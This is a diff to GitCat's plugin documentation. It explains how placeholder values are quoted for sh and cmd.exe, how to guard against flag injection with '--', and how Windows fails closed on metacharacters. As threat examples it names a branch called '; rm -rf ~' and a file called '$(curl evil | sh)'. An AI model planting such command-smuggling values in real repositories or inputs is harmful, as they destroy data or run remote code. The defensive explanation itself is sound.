@@ -178,7 +178,7 @@ and friends are right there).
 
 Rules the expander follows:
 
-- **Every substituted value is POSIX single-quoted** so the shell treats it as one inert literal argument — it can't word-split, glob, expand a variable, run a command substitution, or break out of its argument.
+- **Every substituted value is quoted** so the shell treats it as one inert literal argument — it can't word-split, glob, expand a variable, run a command substitution, or break out of its argument. On macOS/Linux that's POSIX single-quoting for `sh`; on Windows it's double-quoting for `cmd.exe` (see [Windows](#windows-caveat)).
 - **The grammar is narrow**: a token is `{` + one-or-more **lowercase ASCII letters** + `}`. Anything else is left verbatim, so your own shell syntax survives untouched — `${HOME}` (uppercase), `${1}` (digit), `awk '{print $1}'` (space), and `{}` are all copied through, not treated as tokens.
 - **Unknown tokens expand to nothing.** An unrecognized `{name}`, or a token whose value is absent, becomes an empty string.
 - **Single pass, no re-expansion.** A value that itself contains `{repo}` or `{sha}` text (e.g. inside a diff) is never re-scanned, so untrusted content can't smuggle in a second placeholder.
@@ -202,14 +202,14 @@ substitution:
 
 Each path arrives as its own quoted argument, so a file named `my file.ts` is
 one argument, not two. Put `--` before `{files}` so a file whose name starts
-with `-` is never read as an option (see below). The
-[Windows caveat](#windows-caveat) applies to `{files}` like every other token:
-the quoting is POSIX single-quoting, and a path containing a `cmd.exe`
-metacharacter makes GitCat refuse the run rather than risk it.
+with `-` is never read as an option (see below). The same line runs unchanged
+on Windows, where each path is double-quoted for `cmd.exe` instead. As with
+every token there, a path containing a `cmd.exe` metacharacter makes GitCat
+refuse the run rather than risk it (see [Windows](#windows-caveat)).
 
 ### Values are untrusted — guard against flag injection
 
-Placeholder values come from whatever repository is open, which a malicious project controls freely: a branch literally named `; rm -rf ~`, a file named `$(curl evil | sh)`, diff text full of backticks. Single-quoting neutralizes all of that as *shell* injection — but it does **not** change argument boundaries. A value that starts with `-` (a branch named `--upload-pack=…`, a ref `-n`) is still handed to your tool as an **option**.
+Placeholder values come from whatever repository is open, which a malicious project controls freely: a branch literally named `; rm -rf ~`, a file named `$(curl evil | sh)`, diff text full of backticks. Quoting neutralizes all of that as *shell* injection — but it does **not** change argument boundaries. A value that starts with `-` (a branch named `--upload-pack=…`, a ref `-n`) is still handed to your tool as an **option**.
 
 **Put a `--` end-of-options separator before any untrusted placeholder:**
 
@@ -220,13 +220,15 @@ Placeholder values come from whatever repository is open, which a malicious proj
 
 ### The command runs in the repo
 
-The expanded command runs with the **repository as its working directory** (the same path `{repo}` expands to). A command invoked with **no repository open is refused** — there's nowhere sensible to run it. Commands are run through the platform shell (`sh -c` on macOS/Linux, `cmd /C` on Windows), so a `run` line can be a full command line with arguments and pipes. There's a **120-second timeout**; stdout is captured (ANSI escapes stripped), and a non-zero exit is reported as a normal outcome, not a hard error.
+The expanded command runs with the **repository as its working directory** (the same path `{repo}` expands to). A command invoked with **no repository open is refused** — there's nowhere sensible to run it. Commands are run through the platform shell (`sh -c` on macOS/Linux, `cmd.exe /S /C` on Windows), so a `run` line can be a full command line with arguments and pipes. There's a **120-second timeout**; stdout is captured (ANSI escapes stripped), and a non-zero exit is reported as a normal outcome, not a hard error.
 
-### Windows caveat
+### Windows {#windows-caveat}
 
-The shell quoting above is POSIX single-quoting, which `cmd.exe` does **not** interpret the same way. So on Windows GitCat **fails closed**: before running, it refuses the command if any substituted value contains a character `cmd.exe` would act on regardless of quoting — `& | < > ^ % ! "` or a carriage return / newline. This blocks injection through a hostile branch/ref/file name, at the cost of refusing some legitimate values. In particular **`{diff}` is almost always refused on Windows** (diffs routinely contain those characters).
+On Windows the template runs under `cmd.exe`, and every placeholder value is **double-quoted** for it (`"a b.txt"`), so a path with spaces is one argument there too. Your template's own text, including its own double quotes, reaches `cmd` exactly as written.
 
-Practically: **write `run` lines for a POSIX shell.** Windows plugins should target Git-Bash or WSL on `PATH` rather than raw `cmd`.
+Double quotes alone can't stop `cmd` from acting on a few characters, so GitCat **fails closed** first: before running, it refuses the command if any substituted value contains `& | < > ^ % ! "` or a carriage return / newline. This blocks injection through a hostile branch/ref/file name, at the cost of refusing some legitimate values. In particular **`{diff}` is almost always refused on Windows** (diffs routinely contain those characters).
+
+The template itself is still `cmd` syntax on Windows and `sh` syntax elsewhere. To write one `run` line that works on both, stick to a program, its arguments, and placeholders: `&&`, `||`, `|`, `>` and "double-quoted" arguments mean the same in both shells. Single quotes, `$VAR`, `$(...)` and backticks are `sh`-only, and the program you name must exist on Windows (`grep`, for one, doesn't ship with it).
 
 ## Hooks
 
